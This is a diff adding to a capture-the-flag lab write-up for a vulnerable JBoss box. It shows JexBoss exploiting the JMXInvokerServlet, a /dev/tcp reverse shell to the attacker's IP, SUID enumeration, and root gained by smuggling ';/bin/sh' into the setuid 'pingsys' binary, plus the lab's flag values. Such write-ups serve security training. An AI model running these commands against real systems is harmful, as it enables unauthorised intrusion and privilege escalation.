@@ -239,3 +239,244 @@ python jexboss.py -h
 ┌──(witty㉿kali)-[~/Downloads/jexboss]
 └─$ python jexboss.py -host http://jacobtheboss.box:8080
 
+ * --- JexBoss: Jboss verify and EXploitation Tool  --- *
+ |  * And others Java Deserialization Vulnerabilities * | 
+ |                                                      |
+ | @author:  João Filho Matos Figueiredo                |
+ | @contact: joaomatosf@gmail.com                       |
+ |                                                      |
+ | @update: https://github.com/joaomatosf/jexboss       |
+ #______________________________________________________#
+
+ @version: 1.2.4
+
+ * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **
+
+ ** Checking Host: http://jacobtheboss.box:8080 **
+
+ [*] Checking jmx-console:                 
+  [ VULNERABLE ]
+ [*] Checking web-console:                 
+  [ VULNERABLE ]
+ [*] Checking JMXInvokerServlet:           
+  [ VULNERABLE ]
+ [*] Checking admin-console:               
+  [ OK ]
+ [*] Checking Application Deserialization: 
+  [ OK ]
+ [*] Checking Servlet Deserialization:     
+  [ OK ]
+ [*] Checking Jenkins:                     
+  [ OK ]
+ [*] Checking Struts2:                     
+  [ OK ]
+
+ * Do you want to try to run an automated exploitation via "jmx-console" ?
+   If successful, this operation will provide a simple command shell to execute 
+   commands on the server..
+   Continue only if you have permission!
+   yes/NO? no
+
+ * Do you want to try to run an automated exploitation via "web-console" ?
+   If successful, this operation will provide a simple command shell to execute 
+   commands on the server..
+   Continue only if you have permission!
+   yes/NO? no
+
+ * Do you want to try to run an automated exploitation via "JMXInvokerServlet" ?
+   If successful, this operation will provide a simple command shell to execute 
+   commands on the server..
+   Continue only if you have permission!
+   yes/NO? yes
+
+ * Sending exploit code to http://jacobtheboss.box:8080. Please wait...
+
+ * Successfully deployed code! Starting command shell. Please wait...
+```
+```text
+# ----------------------------------------- # LOL # ----------------------------------------- #
+
+ * http://jacobtheboss.box:8080:
+```
+```text
+# ----------------------------------------- #
+
+ * For a Reverse Shell (like meterpreter =]), type the command: 
+
+   jexremote=YOUR_IP:YOUR_PORT
+
+   Example:
+     Shell>jexremote=192.168.0.10:4444
+
+   Or use other techniques of your choice, like:
+     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1
+   
+   And so on... =]
+```
+
+## Exploitation
+```text
+# ----------------------------------------- #
+
+  Failed to check for updates
+Linux jacobtheboss.box 3.10.0-1127.18.2.el7.x86_64 #1 SMP Sun Jul 26 15:27:06 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+'  Failed to check for updates
+\\S
+Kernel \\r on an \\m
+
+'  Failed to check for updates
+uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
+'
+[Type commands or "exit" to finish]
+Shell> id
+ Failed to check for updates
+uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
+'
+[Type commands or "exit" to finish]
+Shell> /bin/bash -i > /dev/tcp/10.8.19.103/4444 0>&1 2>&1
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444 
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.59.221] 33766
+bash: no job control in this shell
+[jacob@jacobtheboss /]$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+<wn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null                 
+bash: python3: command not found
+[jacob@jacobtheboss /]$ ls
+ls
+bin   dev  home  lib64	mnt  proc  run	 srv	   sys	usr
+boot  etc  lib	 media	opt  root  sbin  swapfile  tmp	var
+[jacob@jacobtheboss /]$ cd /home
+cd /home
+[jacob@jacobtheboss home]$ ls
+ls
+jacob
+[jacob@jacobtheboss home]$ cd jacob
+cd jacob
+[jacob@jacobtheboss ~]$ ls
+ls
+user.txt
+[jacob@jacobtheboss ~]$ cat user.txt
+cat user.txt
+f4d491f280de360cc49e26ca1587cbcc
+
+[jacob@jacobtheboss ~]$ getcap -r / 2>/dev/null
+getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/sbin/arping = cap_net_raw+p
+[jacob@jacobtheboss ~]$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
+<d / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;                      
+-rwsr-xr-x. 1 root root 8536 Jul 30  2020 /usr/bin/pingsys
+-rwsr-xr-x. 1 root root 32096 Oct 30  2018 /usr/bin/fusermount
+-rwsr-xr-x. 1 root root 78408 Aug  9  2019 /usr/bin/gpasswd
+-rwsr-xr-x. 1 root root 32128 Apr  1  2020 /usr/bin/su
+-rws--x--x. 1 root root 23968 Apr  1  2020 /usr/bin/chfn
+-rwsr-xr-x. 1 root root 41936 Aug  9  2019 /usr/bin/newgrp
+-rws--x--x. 1 root root 23880 Apr  1  2020 /usr/bin/chsh
+---s--x--x. 1 root root 147336 Apr  1  2020 /usr/bin/sudo
+-rwsr-xr-x. 1 root root 44264 Apr  1  2020 /usr/bin/mount
+-rwsr-xr-x. 1 root root 73888 Aug  9  2019 /usr/bin/chage
+-rwsr-xr-x. 1 root root 31984 Apr  1  2020 /usr/bin/umount
+-rwsr-xr-x. 1 root root 57656 Aug  8  2019 /usr/bin/crontab
+-rwsr-xr-x. 1 root root 23576 Apr  1  2020 /usr/bin/pkexec
+-rwsr-xr-x. 1 root root 27856 Apr  1  2020 /usr/bin/passwd
+-rwsr-xr-x. 1 root root 11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
+-rwsr-xr-x. 1 root root 36272 Apr  1  2020 /usr/sbin/unix_chkpwd
+-rwsr-xr-x. 1 root root 11296 Apr  1  2020 /usr/sbin/usernetctl
+-rwsr-xr-x. 1 root root 117432 Apr  1  2020 /usr/sbin/mount.nfs
+-rwsr-xr-x. 1 root root 15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
+-rwsr-x---. 1 root dbus 57936 Jul 13  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
+[jacob@jacobtheboss ~]$ file /usr/bin/pingsys
+file /usr/bin/pingsys
+/usr/bin/pingsys: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=6edc93ec3e4b82857772727e602265140ee00823, not stripped
+[jacob@jacobtheboss ~]$ ltrace /usr/bin/pingsys
+ltrace /usr/bin/pingsys
+bash: ltrace: command not found
+[jacob@jacobtheboss ~]$ strings /usr/bin/pingsys
+strings /usr/bin/pingsys
+/lib64/ld-linux-x86-64.so.2
+wrr~`"e
+libc.so.6
+setuid
+system
+__libc_start_main
+snprintf
+__gmon_start__
+GLIBC_2.2.5
+UH-P
+UH-P
+[]A\A]A^A_
+ping -c 4 %s
+setUID ERROR
+
+[jacob@jacobtheboss ~]$ ip addr
+ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 02:2c:1b:a1:89:7f brd ff:ff:ff:ff:ff:ff
+    inet 10.10.59.221/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 3512sec preferred_lft 3512sec
+    inet6 fe80::2c:1bff:fea1:897f/64 scope link 
+       valid_lft forever preferred_lft forever
+
+sh-4.2$ /usr/bin/pingsys 127.0.0.1;/bin/sh
+/usr/bin/pingsys 127.0.0.1;/bin/sh
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.030 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.032 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.030 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 2999ms
+rtt min/avg/max/mdev = 0.019/0.027/0.032/0.008 ms
+sh-4.2$ id
+id
+uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
+sh-4.2$ cd /root
+cd /root
+sh: cd: /root: Permission denied
+sh-4.2$ /usr/bin/pingsys '127.0.0.1;/bin/sh'
+/usr/bin/pingsys '127.0.0.1;/bin/sh'
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.030 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.032 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.035 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 2999ms
+rtt min/avg/max/mdev = 0.018/0.028/0.035/0.009 ms
+sh-4.2# id
+id
+uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
+sh-4.2# cd /root
+cd /root
+sh-4.2# ls
+ls
+anaconda-ks.cfg  jboss.sh  original-ks.cfg  root.txt
+sh-4.2# cat root.txt
+cat root.txt
+29a5641eaa0c01abe5749608c8232806
+sh-4.2# cat jboss.sh
+cat jboss.sh
+#!/bin/bash
+
+sudo -u jacob sh /srv/jboss/bin/run.sh -b jacobtheboss.box
+```
+user.txt
+*f4d491f280de360cc49e26ca1587cbcc*
+root.txt
+*29a5641eaa0c01abe5749608c8232806*
+
+## Notes / Lessons Learned
+[[Aratus]]
+
